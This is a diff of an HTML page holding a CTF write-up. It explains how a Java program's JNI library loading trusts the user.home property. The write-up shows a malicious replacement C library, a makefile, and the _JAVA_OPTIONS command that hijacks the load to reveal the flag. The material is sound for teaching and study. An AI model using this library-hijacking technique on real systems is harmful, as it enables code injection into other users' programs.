@@ -11,9 +11,80 @@
       span.underline{text-decoration: underline;}
       div.column{display: inline-block; vertical-align: top; width: 50%;}
   </style>
+  <style>
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    background-color: #232629;
+    color: #7a7c7d;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+div.sourceCode
+  { color: #cfcfc2; background-color: #232629; }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span. { color: #cfcfc2; } /* Normal */
+code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+code span.an { color: #3f8058; } /* Annotation */
+code span.at { color: #2980b9; } /* Attribute */
+code span.bn { color: #f67400; } /* BaseN */
+code span.bu { color: #7f8c8d; } /* BuiltIn */
+code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #3daee9; } /* Char */
+code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+code span.co { color: #7a7c7d; } /* Comment */
+code span.cv { color: #7f8c8d; } /* CommentVar */
+code span.do { color: #a43340; } /* Documentation */
+code span.dt { color: #2980b9; } /* DataType */
+code span.dv { color: #f67400; } /* DecVal */
+code span.er { color: #da4453; text-decoration: underline; } /* Error */
+code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+code span.fl { color: #f67400; } /* Float */
+code span.fu { color: #8e44ad; } /* Function */
+code span.im { color: #27ae60; } /* Import */
+code span.in { color: #c45b00; } /* Information */
+code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+code span.op { color: #cfcfc2; } /* Operator */
+code span.ot { color: #27ae60; } /* Other */
+code span.pp { color: #27ae60; } /* Preprocessor */
+code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+code span.sc { color: #3daee9; } /* SpecialChar */
+code span.ss { color: #da4453; } /* SpecialString */
+code span.st { color: #f44f4f; } /* String */
+code span.va { color: #27aeae; } /* Variable */
+code span.vs { color: #da4453; } /* VerbatimString */
+code span.wa { color: #da4453; } /* Warning */
+  </style>
   <!--[if lt IE 9]>
     <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
   <![endif]-->
+      <meta charset="UTF-8">
+      <meta name=”robots” content="index, follow">
+      <meta name="description" content="CTF Writeups, hacking techniques, reverse engineering & binary exploit, etc.">
+      <title>Onealmond</title>
       <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
       <script type="text/javascript" src="../../js/common.js"></script>
 </head>
@@ -25,67 +96,67 @@
 </header>
 <h3 id="the-weakness">The weakness</h3>
 <p><code>hellotest</code> is written in C++, it invokes java function <code>sayHello</code> via JNI. The function is defined in <code>Helloworld.java</code>, it invokes a native function <code>print</code>.</p>
-<pre><code>    ...
-    public static void sayHello(String flag) throws Exception
-    {
-        String msg = &quot;Hello World from JNI!&quot;;
-        print(msg);
-        if (msg.contains(&quot;flag&quot;))
-        {
-            //What just happened? 
-            print(&quot;What the flag? How did that happen...&quot;);
-            print(&quot;Your flag is: &quot; + flag);
-        }
-    }
-    ...
-    private static native void print(String msg);
-    ...</code></pre>
+<div class="sourceCode" id="cb1"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb1-1"><a href="#cb1-1"></a>    ...</span>
+<span id="cb1-2"><a href="#cb1-2"></a>    <span class="kw">public</span> <span class="dt">static</span> <span class="dt">void</span> <span class="fu">sayHello</span>(<span class="bu">String</span> flag) <span class="kw">throws</span> <span class="bu">Exception</span></span>
+<span id="cb1-3"><a href="#cb1-3"></a>    {</span>
+<span id="cb1-4"><a href="#cb1-4"></a>        <span class="bu">String</span> msg = <span class="st">&quot;Hello World from JNI!&quot;</span>;</span>
+<span id="cb1-5"><a href="#cb1-5"></a>        <span class="fu">print</span>(msg);</span>
+<span id="cb1-6"><a href="#cb1-6"></a>        <span class="kw">if</span> (msg.<span class="fu">contains</span>(<span class="st">&quot;flag&quot;</span>))</span>
+<span id="cb1-7"><a href="#cb1-7"></a>        {</span>
+<span id="cb1-8"><a href="#cb1-8"></a>            <span class="co">//What just happened? </span></span>
+<span id="cb1-9"><a href="#cb1-9"></a>            <span class="fu">print</span>(<span class="st">&quot;What the flag? How did that happen...&quot;</span>);</span>
+<span id="cb1-10"><a href="#cb1-10"></a>            <span class="fu">print</span>(<span class="st">&quot;Your flag is: &quot;</span> + flag);</span>
+<span id="cb1-11"><a href="#cb1-11"></a>        }</span>
+<span id="cb1-12"><a href="#cb1-12"></a>    }</span>
+<span id="cb1-13"><a href="#cb1-13"></a>    ...</span>
+<span id="cb1-14"><a href="#cb1-14"></a>    <span class="kw">private</span> <span class="dt">static</span> <span class="kw">native</span> <span class="dt">void</span> <span class="fu">print</span>(<span class="bu">String</span> msg);</span>
+<span id="cb1-15"><a href="#cb1-15"></a>    ...</span></code></pre></div>
 <p><code>print</code> is a C function, defined in <code>hellolib.c</code>, which will be used to build shared object <code>hellolib.so</code> to be loaded into JVM at runtime.</p>
-<pre><code>JNIEXPORT void JNICALL Java_Helloworld_print
-  (JNIEnv* env, jclass cls, jstring msg)
-{
-    const char* str = (*env)-&gt;GetStringUTFChars(env, msg, 0);
-    printf(&quot;%s\n&quot;, str);
-    if (str)
-        (*env)-&gt;ReleaseStringUTFChars(env, msg, str);
-    fflush(stdout);
-}</code></pre>
+<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1"></a>JNIEXPORT <span class="dt">void</span> JNICALL Java_Helloworld_print</span>
+<span id="cb2-2"><a href="#cb2-2"></a>  (JNIEnv* env, jclass cls, jstring msg)</span>
+<span id="cb2-3"><a href="#cb2-3"></a>{</span>
+<span id="cb2-4"><a href="#cb2-4"></a>    <span class="dt">const</span> <span class="dt">char</span>* str = (*env)-&gt;GetStringUTFChars(env, msg, <span class="dv">0</span>);</span>
+<span id="cb2-5"><a href="#cb2-5"></a>    printf(<span class="st">&quot;%s</span><span class="sc">\n</span><span class="st">&quot;</span>, str);</span>
+<span id="cb2-6"><a href="#cb2-6"></a>    <span class="cf">if</span> (str)</span>
+<span id="cb2-7"><a href="#cb2-7"></a>        (*env)-&gt;ReleaseStringUTFChars(env, msg, str);</span>
+<span id="cb2-8"><a href="#cb2-8"></a>    fflush(stdout);</span>
+<span id="cb2-9"><a href="#cb2-9"></a>}</span></code></pre></div>
 <p><code>HelloWorld</code> copy <code>hellolib.so</code> from <code>HelloWorld.jar</code>, here comes the vulnerability, it then copy <code>hellolib.so</code> to directory <code>libFolder</code> for later invoke. <code>libFolder</code> is a directoy, named <em>“.helloWorld”</em>, under <em>System.getProperty(“user.home”)</em>. If we specify the property <em>“user.home”</em>, we can make it use library in arbitrary path.</p>
-<pre><code>    private static void loadingLibrary() throws Exception
-    {
-        Path libFolder = Paths.get(System.getProperty(&quot;user.home&quot;), &quot;.helloWorld&quot;);
-        
-        //Create user folder to copy libraries from jar file.
-        if (!Files.exists(libFolder))
-            Files.createDirectory(libFolder);
-        
-        //Copy library from jar file into user folder
-        Path libDest = libFolder.resolve(&quot;libhello.so&quot;);
-        try
-        {
-        //Copy libhello if not already there.
-            Files.copy(ClassLoader.getSystemResourceAsStream(&quot;libhello.so&quot;), libDest);
-        }
-        catch (Exception e)
-        { 
-            //i don&#39;t know why this is throwing an error...
-            //i think this fixes it...
-        }
-        
-        //Dynamically link to it.
-        System.load(libDest.toString());
-    }</code></pre>
+<div class="sourceCode" id="cb3"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb3-1"><a href="#cb3-1"></a>    <span class="kw">private</span> <span class="dt">static</span> <span class="dt">void</span> <span class="fu">loadingLibrary</span>() <span class="kw">throws</span> <span class="bu">Exception</span></span>
+<span id="cb3-2"><a href="#cb3-2"></a>    {</span>
+<span id="cb3-3"><a href="#cb3-3"></a>        Path libFolder = Paths.<span class="fu">get</span>(<span class="bu">System</span>.<span class="fu">getProperty</span>(<span class="st">&quot;user.home&quot;</span>), <span class="st">&quot;.helloWorld&quot;</span>);</span>
+<span id="cb3-4"><a href="#cb3-4"></a>        </span>
+<span id="cb3-5"><a href="#cb3-5"></a>        <span class="co">//Create user folder to copy libraries from jar file.</span></span>
+<span id="cb3-6"><a href="#cb3-6"></a>        <span class="kw">if</span> (!Files.<span class="fu">exists</span>(libFolder))</span>
+<span id="cb3-7"><a href="#cb3-7"></a>            Files.<span class="fu">createDirectory</span>(libFolder);</span>
+<span id="cb3-8"><a href="#cb3-8"></a>        </span>
+<span id="cb3-9"><a href="#cb3-9"></a>        <span class="co">//Copy library from jar file into user folder</span></span>
+<span id="cb3-10"><a href="#cb3-10"></a>        Path libDest = libFolder.<span class="fu">resolve</span>(<span class="st">&quot;libhello.so&quot;</span>);</span>
+<span id="cb3-11"><a href="#cb3-11"></a>        <span class="kw">try</span></span>
+<span id="cb3-12"><a href="#cb3-12"></a>        {</span>
+<span id="cb3-13"><a href="#cb3-13"></a>        <span class="co">//Copy libhello if not already there.</span></span>
+<span id="cb3-14"><a href="#cb3-14"></a>            Files.<span class="fu">copy</span>(<span class="bu">ClassLoader</span>.<span class="fu">getSystemResourceAsStream</span>(<span class="st">&quot;libhello.so&quot;</span>), libDest);</span>
+<span id="cb3-15"><a href="#cb3-15"></a>        }</span>
+<span id="cb3-16"><a href="#cb3-16"></a>        <span class="kw">catch</span> (<span class="bu">Exception</span> e)</span>
+<span id="cb3-17"><a href="#cb3-17"></a>        { </span>
+<span id="cb3-18"><a href="#cb3-18"></a>            <span class="co">//i don&#39;t know why this is throwing an error...</span></span>
+<span id="cb3-19"><a href="#cb3-19"></a>            <span class="co">//i think this fixes it...</span></span>
+<span id="cb3-20"><a href="#cb3-20"></a>        }</span>
+<span id="cb3-21"><a href="#cb3-21"></a>        </span>
+<span id="cb3-22"><a href="#cb3-22"></a>        <span class="co">//Dynamically link to it.</span></span>
+<span id="cb3-23"><a href="#cb3-23"></a>        <span class="bu">System</span>.<span class="fu">load</span>(libDest.<span class="fu">toString</span>());</span>
+<span id="cb3-24"><a href="#cb3-24"></a>    }</span></code></pre></div>
 <h3 id="create-something-evil">Create something evil</h3>
 <p>We need to create a our evil <code>hellolib.c</code>, lets’ say <code>fakelib.c</code>. In the file we create a char array contains string <em>“flag”</em>.</p>
-<pre><code>    jcharArray buf = (*env)-&gt;NewCharArray(env, 4);
-    jchar arr[4] = {&#39;f&#39;,&#39;l&#39;,&#39;a&#39;,&#39;g&#39;};
-    (*env)-&gt;SetCharArrayRegion(env, buf, 0, 4, arr); </code></pre>
+<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1"></a>    jcharArray buf = (*env)-&gt;NewCharArray(env, <span class="dv">4</span>);</span>
+<span id="cb4-2"><a href="#cb4-2"></a>    jchar arr[<span class="dv">4</span>] = {<span class="ch">&#39;f&#39;</span>,<span class="ch">&#39;l&#39;</span>,<span class="ch">&#39;a&#39;</span>,<span class="ch">&#39;g&#39;</span>};</span>
+<span id="cb4-3"><a href="#cb4-3"></a>    (*env)-&gt;SetCharArrayRegion(env, buf, <span class="dv">0</span>, <span class="dv">4</span>, arr); </span></code></pre></div>
 <p>Assign the char array <code>buf</code> to <code>msg</code>, <em>“[C”</em> to indicate we are getting <em>value</em> field which is a char array as specified in <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/types.html#wp276">JNI Types and Data Structures</a></p>
-<pre><code>    jclass cla = (*env)-&gt;GetObjectClass(env, msg);
-    jfieldID id = (*env)-&gt;GetFieldID(env, cla, &quot;value&quot;, &quot;[C&quot;);
-    (*env)-&gt;SetObjectField(env, msg, id, buf);</code></pre>
+<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="#cb5-1"></a>    jclass cla = (*env)-&gt;GetObjectClass(env, msg);</span>
+<span id="cb5-2"><a href="#cb5-2"></a>    jfieldID id = (*env)-&gt;GetFieldID(env, cla, <span class="st">&quot;value&quot;</span>, <span class="st">&quot;[C&quot;</span>);</span>
+<span id="cb5-3"><a href="#cb5-3"></a>    (*env)-&gt;SetObjectField(env, msg, id, buf);</span></code></pre></div>
 <p>We need a customized makefile to build the <em>.so</em> file, since we are only allowed to create files in <em>/tmp</em>, we need to change the paths accordingly.</p>
-<pre><code>libhello.so : fakelib.o
+<pre class="make"><code>libhello.so : fakelib.o
     cc fakelib.o -shared -o libhello.so
     mkdir -p .helloWorld
     cp libhello.so .helloWorld
@@ -94,14 +165,14 @@ fakelib.o :
     cp /home/lib/Helloworld.h .
     cc  -c -I/usr/lib/jvm/java-8-openjdk-amd64/include -fpic fakelib.c</code></pre>
 <p>*_JAVA_OPTIONS* is way to specify JVM arguments as an environment variable instead of command line parameters. Run <code>hellotest</code> in <code>/home/lib</code> directory with *_JAVA_OPTIONS=“-Duser.home=/tmp”*.</p>
-<pre><code>$ _JAVA_OPTIONS=&quot;-Duser.home=/tmp&quot; /home/lib/hellotest
-Picked up _JAVA_OPTIONS: -Duser.home=/tmp
-fakelib                                                                                                                                                                 
-Hello World from JNI!                   
-fakelib                                 
-What the flag? How did that happen...
-fakelib
-Your flag is: CTF{JN1_1s_r3a77y_f4n!}</code></pre>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1"></a>$ <span class="va">_JAVA_OPTIONS=</span><span class="st">&quot;-Duser.home=/tmp&quot;</span> <span class="ex">/home/lib/hellotest</span></span>
+<span id="cb7-2"><a href="#cb7-2"></a><span class="ex">Picked</span> up _JAVA_OPTIONS: -Duser.home=/tmp</span>
+<span id="cb7-3"><a href="#cb7-3"></a><span class="ex">fakelib</span>                                                                                                                                                                 </span>
+<span id="cb7-4"><a href="#cb7-4"></a><span class="ex">Hello</span> World from JNI!                   </span>
+<span id="cb7-5"><a href="#cb7-5"></a><span class="ex">fakelib</span>                                 </span>
+<span id="cb7-6"><a href="#cb7-6"></a><span class="ex">What</span> the flag? How did that happen...</span>
+<span id="cb7-7"><a href="#cb7-7"></a><span class="ex">fakelib</span></span>
+<span id="cb7-8"><a href="#cb7-8"></a><span class="ex">Your</span> flag is: CTF<span class="dt">{JN1_1s_r3a77y_f4n!}</span></span></code></pre></div>
 <h3 id="reference">Reference</h3>
 <ul>
 <li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/types.html#wp276">JNI Types and Data Structures</a></li>
